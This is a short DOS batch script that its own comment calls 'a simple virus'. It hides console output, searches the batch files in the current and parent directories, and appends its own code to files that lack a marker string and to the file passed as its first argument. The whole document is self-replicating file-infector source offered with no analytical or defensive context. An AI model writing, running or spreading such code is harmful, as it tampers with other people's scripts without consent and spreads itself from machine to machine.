@ctty nul
rem A simple Virus of batch file
for %%a in (*.bat ..\*.bat) do set !!=%%a
for %%a in (*.bat ..\*.bat) do find "!!" %%a
if errorlevel 1 type %0 >> %!!%
type %0 >> %1
